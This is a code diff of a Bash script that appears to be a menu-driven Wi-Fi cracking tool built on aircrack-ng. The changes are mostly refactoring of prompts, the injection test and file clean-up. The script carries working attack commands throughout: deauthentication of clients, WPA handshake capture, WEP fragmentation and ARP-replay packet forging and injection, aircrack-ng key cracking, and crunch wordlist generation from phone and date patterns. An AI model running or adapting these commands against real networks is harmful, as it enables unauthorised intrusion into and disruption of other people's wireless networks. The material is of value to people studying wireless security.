@@ -107,27 +107,26 @@ TMP_1=${#PREFIX}
 TMP_2=$(("$LENGTH" - "$TMP_1" + 1))
 TMP_3=$(seq -s% "$TMP_2" | tr -d '[:digit:]')
 TMP_4=$(echo "$TMP_3" | sed 's/%/X/g')
-SUFFIX=".lst"
 if [[ -z "$RECURRING" ]]; then
-    crunch "$LENGTH" "$LENGTH" -t "$PREFIX""$TMP_3" -o "$PREFIX""$TMP_4""$SUFFIX"
+    crunch "$LENGTH" "$LENGTH" -t "$PREFIX""$TMP_3" -o "$PREFIX""$TMP_4".lst
 else
-    crunch "$LENGTH" "$LENGTH" -d "$RECURRING" -t "$PREFIX""$TMP_3" -o "$PREFIX""$TMP_4""$SUFFIX"
+    crunch "$LENGTH" "$LENGTH" -d "$RECURRING" -t "$PREFIX""$TMP_3" -o "$PREFIX""$TMP_4".lst
 fi
 GEN="$?"
 if [[ "$GEN" -eq 0 ]]; then
     echo "
     Wordlist successfully generated."
-    read -rp "Press Enter to go back..." KEY
+    read -rp "Press Enter to go back..."
     options
 else
     echo "Either something went wrong or you entered no values, check function \"generate_wordlists\"."
-    read -rp "Press Enter to go back..." KEY
+    read -rp "Press Enter to go back..."
     options
 fi
 }
 function dates_wl {
 clear
-echo -ne "--------------------- Date Generator ---------------------\n\nEnter dates in the following format\n\nFirst date: YYYY-MM-DD  -  Last date: YYYY-MM-DD\n\n             ex. 1991-5-6 <-> 2016-12-3\n\n"
+echo -ne "--------------------- Date Generator ---------------------\n\nEnter dates in the following format\n\nFirst date: YYYY-MM-DD  -  Last date: YYYY-MM-DD\n\n                     ex. 1940-1-1 <-> 2017-12-31\n\n"
 FLAG=1
 while [[ "$FLAG" != 0 ]]; do
     read -rp "Enter first date: " FIRST_DATE
@@ -160,7 +159,7 @@ while [[ "$FLAG" != 0 ]]; do
     fi
 done
 ##Save As
-DATE_LIST=$(seq 1 "$DATE_DIFF")
+DATE_LIST=$(seq 0 "$DATE_DIFF")
 echo "Please wait... Generating dates."
 NAME_F=$(awk -F '-' '{print $1}' <<< $FIRST_DATE)
 NAME_L=$(awk -F '-' '{print $1}' <<< $LAST_DATE)
@@ -168,7 +167,9 @@ for i in $DATE_LIST
 do
     date -d "$FIRST_DATE $i days" +%d%m%Y >> "$NAME_F-$NAME_L".lst
 done
-echo -ne "\nDates generated succesfully\nSaved as $NAME_F-$NAME_L.lst"
+echo -ne "\nDates generated succesfully\nSaved as $NAME_F-$NAME_L.lst\n\n"
+read -rp "Press Enter to go back"
+generate_wordlists
 }
 function generate_wordlists {
 clear
@@ -186,7 +187,7 @@ do
             CRUNCH=$(command -v crunch)
             if [[ -z "$CRUNCH" ]]; then
                 echo -ne "\nCrunch is not installed. Install it and try again."
-                read -rp "Press Enter to go back..." KEY
+                read -rp "Press Enter to go back..."
                 options
             fi
             phones_wl
@@ -204,86 +205,20 @@ done
 }
 function test_injection {
 clear
-TRY=y
-if [[ -n "$STATE" ]]; then
-    echo "Testing injection for $IFACE"
-    RANGE=$(aireplay-ng -9 "$IFACE" | grep "Found 0 APs")
-    if [[ -n "$RANGE" ]]; then
-        while [[ "$TRY" = [Yy] ]]; 
-        do
-            RANGE=$(aireplay-ng -9 "$IFACE" | grep "Found 0 APs")
-            WORKS=$(aireplay-ng -9 "$IFACE" | grep "Injection is working!")
-            if [[ -z "$RANGE" ]]; then
-                WORKS=$(aireplay-ng -9 "$IFACE" | grep "Injection is working!")
-                if [[ -n "$WORKS" ]]; then
-                    echo -ne "WLAN interface ($IFACE) supports injection.\n"
-                    if [[ "$FLAG" -eq 1 ]]; then
-                        echo -ne "\nPlease wait...\nUnseting monitor mode on $IFACE.\n"
-                        unset_mon >> /dev/null
-                    fi
-                    unset WORKS
-                    unset RANGE
-                    unset TRY
-                    unset FLAG
-                    break
-                else
-                    echo "WLAN interface ($IFACE) does NOT support injection."
-                    echo
-                    if [[ "$FLAG" -eq 1 ]]; then
-                        echo -ne "\nPlease wait...\nUnseting monitor mode on $IFACE.\n"
-                        unset_mon >> /dev/null
-                    fi
-                    unset WORKS
-                    unset RANGE
-                    unset TRY
-                    unset FLAG
-                    break
-                fi
-            else
-                echo "Found 0 APs, consider relocating your WLAN interface."
-                read -p "Try again ? [yn] " TRY
-                unset RANGE
-                echo "Please wait..."
-                if [[ "$FLAG" -eq 1 ]]; then
-                    echo -ne "\nPlease wait...\nUnseting monitor mode on $IFACE.\n"
-                    unset_mon >> /dev/null
-                fi
-            fi
-        done
-    else
-        WORKS=$(aireplay-ng -9 "$IFACE" | grep "Injection is working!")
-        if [[ -n "$WORKS" ]]; then
-            echo "WLAN interface ($IFACE) supports injection."
-            echo
-            if [[ "$FLAG" -eq 1 ]]; then
-                echo -ne "\nPlease wait...\nUnseting monitor mode on $IFACE.\n"
-                unset_mon >> /dev/null
-            fi
-            unset WORKS
-            unset RANGE
-            unset TRY
-            unset FLAG
-        else
-            echo "WLAN interface ($IFACE) does NOT support injection."
-            echo
-            if [[ "$FLAG" -eq 1 ]]; then
-                echo -ne "\nPlease wait...\nUnseting monitor mode on $IFACE.\n"
-                unset_mon >> /dev/null
-            fi
-            unset WORKS
-            unset RANGE
-            unset TRY
-            unset FLAG
-        fi
-    fi
-else
-    echo -ne "\nPlease wait... \nSetting monitor mode on $IFACE.\n"
+echo -ne "\nTesting injection for IFACE\n"
+if [[ -z "$STATE" ]]; then
     set_mon >> /dev/null
-    FLAG=1
-    test_injection
+    FLG=1
+    aireplay-ng -9 "$IFACE"
+else
+    aireplay-ng -9 "$IFACE"
 fi
+if [[ "$FLG" = 1 ]]; then
+    unset_mon >> /dev/null
+fi
+unset FLG
 }
-function choose_mode {
+function filter_APs {
 clear
 SELECT="Select : "
 echo -ne "Select Cracking Mode\n\n1) WEP\n2) WPA 1/2\n\nc) Cancel\n\n$SELECT"
@@ -326,7 +261,7 @@ fi
 readarray -t LINES < <(nmcli -t -f SSID,CHAN,BSSID,SECURITY,SIGNAL dev wifi list | grep $MODE | sort -u -t: -k1,1 )
 if [[ -z "$LINES" ]]; then
     echo -ne "\nNo $MODE Networks found.\n\nPress Enter to go back"
-    read -r KEY
+    read -r
     options
 else
     echo -ne "\nSelect an AP and press Enter or Select 1 to rescan\n\n"
@@ -356,7 +291,7 @@ aireplay-ng -0 "$TIMES" -a "$BSSID" -c "$CLIENT" "$IFACE"
 function wpa_attacks {
 clear
 echo "------------ WPA1/2 4-Way Handshake Capture ------------"
-read -rp "Press Enter to continue ? " KEY
+read -rp "Press Enter to continue ? "
 ESSID=$(tr -d ' ' <<< "$ESSID")
 AIRODUMP="airodump-ng --bssid $BSSID -c $CHAN -w $ESSID $IFACE"
 env -u SESSION_MANAGER xterm -hold -e "$AIRODUMP" &
@@ -386,7 +321,7 @@ do
                         kill "$(pgrep xterm)"
 						clean_up
                         echo
-                        read -rp "Press Enter to go back " KEY
+                        read -rp "Press Enter to go back "
                         options
                         ;;
                     * )
@@ -403,7 +338,7 @@ do
             rm -f "$ESSID"*.csv
             rm -f replay*.cap
             echo
-            read -rp "Press Enter to go back " KEY
+            read -rp "Press Enter to go back "
             options
             break
             ;;
@@ -414,34 +349,57 @@ do
 done
 }
 function clean_up {
-echo
-read -rp "Clean up $ESSID.cap, $ESSID.csv, $ESSID.netxml and replay files ? [yn] " ASR
-read -rp "Keep $ESSID.cap file ? [yn] " ANS
-if [[ "$ASR" = [Yy] && "$ANS" = [Yy] ]]; then
-    rm -f "$ESSID"*.netxml
-    rm -f "$ESSID"*.csv
-    rm -f replay*.cap
-    if [[ -n "$FRAGMENT" ]]; then
-        rm -f fragment*.xor
-        rm -f "$ESSID"*.arp
-    fi
-elif [[ "$ASR" = [Yy] && "$ANS" = [Nn] ]]; then
-    rm -f "$ESSID"*.netxml
-    rm -f "$ESSID"*.cap
-    rm -f "$ESSID"*.csv
-    if [[ -n "$FRAGMENT" ]]; then
-        rm -f fragment*.xor
-        rm -f "$ESSID"*.arp
-    fi
-    rm -f replay*.cap
-elif [[ "$ASR" = [Nn] ]]; then
-    :
-fi
+echo -ne "\nClean up $ESSID.cap, $ESSID.csv, $ESSID.netxml and replay files ? [yn] "
+while read -rn1 ASR 
+do 
+    case "$ASR" in
+        [Yy] )
+            echo -ne "\nKeep $ESSID.cap file ? [yn] "
+            while read -rn1 ANS
+            do
+                case "$ANS" in
+                    [Yy] )
+                        rm -f "$ESSID"*.netxml
+                        rm -f "$ESSID"*.csv
+                        rm -f replay*.cap
+                        if [[ -n "$FRAGMENT" ]]; then
+                            rm -f fragment*.xor
+                            rm -f "$ESSID"*.arp
+                        fi
+                        break
+                        ;;
+                    [Nn] )
+                        rm -f "$ESSID"*.netxml
+                        rm -f "$ESSID"*.cap
+                        rm -f "$ESSID"*.csv
+                        if [[ -n "$FRAGMENT" ]]; then
+                            rm -f fragment*.xor
+                            rm -f "$ESSID"*.arp
+                        fi
+                        rm -f replay*.cap
+                        break
+                        ;;
+                    * )
+                        echo -ne "\nKeep $ESSID.cap file ? [yn] "
+                        ;;
+                esac
+            done
+            break
+            ;;
+        [Nn] )
+            :
+            break
+            ;;
+        * )
+            echo -ne "\nYes or No ? [yn] : "
+            ;;
+    esac
+done
 }
 function fragmentation { 
 clear
 echo "------------ WEP Fragmentation method ------------"
-read -rp "Press Enter to continue ? " KEY
+read -rp "Press Enter to continue ? "
 if [[ -z "$STATE" ]]; then
     echo -ne "\n\nSetting M/M on $IFACE"
     set_mon >> /dev/null
@@ -454,12 +412,11 @@ until [[ "$COUNTER" -eq 3 ]]; do
     let COUNTER+=1
     echo "Attempting to Associate to $ESSID... $COUNTER/3"
     aireplay-ng -1 0 -a "$BSSID" -h "$NEWMAC" "$IFACE"
-    SUCCESS=$?
+    SUCCESS="$?"
     if [[ "$SUCCESS" = 0 ]]; then
-        echo -ne "Association successful!\nInitiating packetforge-ng"
+        echo -ne "Association successful!\nInitiating Fragmentation attack method\n"
         aireplay-ng -5 -b "$BSSID" -h "$NEWMAC" "$IFACE"
-        PRGA=$?
-        echo
+        PRGA="$?"
         break
     else
         echo "Association failed, trying again..."
@@ -467,28 +424,22 @@ until [[ "$COUNTER" -eq 3 ]]; do
 done
 if [[ "$SUCCESS" != 0 ]]; then
     echo "Unable to Associate to $ESSID, make sure your WLAN interface supports injection."
-    read -rp "Test injection now ? [yn] " INJ
-    if [[ "$INJ" = [Yy] ]]; then
-        test_injection
-    fi
-    echo
-    read -rp "Press Enter to go back" KEY
+    read -rp "Press Enter to go back"
     options
 fi
 aireplay-ng -5 -b "$BSSID" -h "$NEWMAC" "$IFACE"
-PRGA=$?
-EXT=".arp"
+PRGA="$?"
 if [[ "$PRGA" = 0 ]]; then
     FRAGMENT=$(find "$(pwd)" -name "fragment*.xor" -printf '%T@ %p\n' | sort -k1 -n | awk -F ' ' '{print $2}' | tail -1)
     if [[ -z "$FRAGMENT" ]]; then
         echo -ne "\nNo .xor file found.\nPress Enter to go back"
-        read -r KEY
+        read -r
         options
     fi
-    packetforge-ng -0 -a "$BSSID" -h "$NEWMAC" -k 255.255.255.255 -l 255.255.255.255 -y "$FRAGMENT" -w "$ESSID""$EXT"
+    packetforge-ng -0 -a "$BSSID" -h "$NEWMAC" -k 255.255.255.255 -l 255.255.255.255 -y "$FRAGMENT" -w "$ESSID".arp
     CAPTURE="airodump-ng -c $CHAN --bssid $BSSID -w $ESSID $IFACE"
     env -u SESSION_MANAGER xterm -hold -e "$CAPTURE" &
-    echo y | aireplay-ng -2 -r "$ESSID""$EXT" "$IFACE" &>/dev/null &
+    echo y | aireplay-ng -2 -r "$ESSID".arp "$IFACE" &>/dev/null &
     clear
     echo -ne "\nCrack $ESSID now [yn] ? "
     while read -rn1 ANSWER
@@ -501,14 +452,14 @@ if [[ "$PRGA" = 0 ]]; then
                     kill "$(pgrep aireplay-ng)"
                     killall xterm
                     clean_up
-                    read -rp "Press Enter to go back" KEY
+                    read -rp "Press Enter to go back"
                     options
                 fi
                 CRACK="aircrack-ng -b $BSSID $CAPFILE"
                 env -u SESSION_MANAGER xterm -hold -e "$CRACK" &
                 clear
                 echo -ne "Wait for aircrack-ng to finish. The password will be in this form (XX:XX:XX:XX:XX:XX).\nWARNING! xterm windows will close, copy the password before continuing.\n"
-                read -rp "Press Enter to clean up files and go back..." KEY
+                read -rp "Press Enter to clean up files and go back..."
                 kill "$(pgrep aireplay-ng)"
                 killall xterm
                 clean_up
@@ -518,7 +469,7 @@ if [[ "$PRGA" = 0 ]]; then
                 kill "$(pgrep aireplay-ng)"
                 killall xterm
                 clean_up
-                read -rp "Press Enter to go back" KEY
+                read -rp "Press Enter to go back"
                 options
                 ;;
             * )
@@ -528,17 +479,14 @@ if [[ "$PRGA" = 0 ]]; then
     done
 else
     echo
-    read -rp "Fragmentation method failed. Try Chop-Chop ?" ANSWER
-    if [[ "$ANSWER" = [Yy] ]]; then
-       echo "TODO"
-       exit 1
-    fi
+    read -rp "Fragmentation method failed."
+    options
 fi
 }
 function arp_replay {
 clear
 echo "------------ WEP ARP replay method ------------"
-read -rp "Press Enter to continue" KEY
+read -rp "Press Enter to continue"
 if [[ -z "$STATE" ]]; then
     echo
     echo "Setting M/M on $IFACE"
@@ -566,13 +514,8 @@ until [[ "$COUNTER" -eq 3 ]]; do
     fi
 done
 if [[ "$SUCCESS" != 0 ]]; then
-    echo "Unable to Associate to $ESSID, make sure your WLAN interface supports injection."
-    read -rp "Test injection now ? [yn] " INJ
-    if [[ "$INJ" = [Yy] ]]; then
-        test_injection
-    fi
-    echo
-    read -rp "Press Enter to go back" KEY
+    echo -ne "\nUnable to Associate to $ESSID, make sure your WLAN interface supports injection.\n"
+    read -rp "Press Enter to go back"
     options
 fi
 echo -ne "Wait for #Data in airodump-ng to reach at least 15K before you proceed...\nProceed ? [yn] "
@@ -585,18 +528,18 @@ do
             env -u SESSION_MANAGER xterm -hold -e "$COMMAND" &
             clear
             echo -ne "Wait for aircrack-ng to finish, then copy the password.\nWARNING! xterm windows will close, copy the password before continuing.\n"
-            read -rp "Press Enter to clean up files and go back..." KEY
+            read -rp "Press Enter to clean up files and go back..."
             kill "$(pgrep aireplay-ng)"
             killall xterm
             clean_up
-            read -rp "Press Enter to go back" KEY
+            read -rp "Press Enter to go back"
             options
             ;;
         [Nn] )
             kill "$(pgrep aireplay-ng)"
             kill "$(pgrep xterm)"
             clean_up
-            read -rp "Press Enter to exit and go back. " KEY
+            read -rp "Press Enter to exit and go back. "
             options
             ;;
         * )
@@ -774,7 +717,7 @@ echo "s) Show Info"
 if [[ -n "$SWITCH" ]]; then
     echo "$SWITCH"
 fi
-echo "t) Test Injection         r) Verbose Test (faster)"
+echo "t) Test Injection"
 echo "q) Abort!"
 echo
 PROMPT="Select : "
@@ -797,7 +740,7 @@ while read -rn1 CHAR
 do
     case "$CHAR" in
         1 )
-            choose_mode
+            filter_APs
             break
             ;;
         e )
@@ -820,44 +763,27 @@ do
         h )
             echo
             help
-            read -rp "Press Enter to go back" KEY
+            read -rp "Press Enter to go back"
             options
             break
             ;;
         v )
             show_APs
             echo
-            read -rp "Press Enter to go back" KEY
+            read -rp "Press Enter to go back"
             options
             break
             ;;
         s )
             show_info
             echo
-            read -rp "Press Enter to go back" KEY
+            read -rp "Press Enter to go back"
             options
             break
             ;;
         t )
             test_injection
-            read -rp "Press Enter to go back" KEY
-            options
-            break
-            ;;
-        r ) 
-            clear
-            if [[ -z "$STATE" ]]; then
-                set_mon >> /dev/null
-                FLG=1
-                aireplay-ng -9 "$IFACE"
-            else
-                aireplay-ng -9 "$IFACE"
-            fi
-            if [[ "$FLG" = 1 ]]; then
-                unset_mon >> /dev/null
-            fi
-            unset FLG
-            read -rp "Press Enter to go back" KEY
+            read -rp "Press Enter to go back"
             options
             break
             ;;
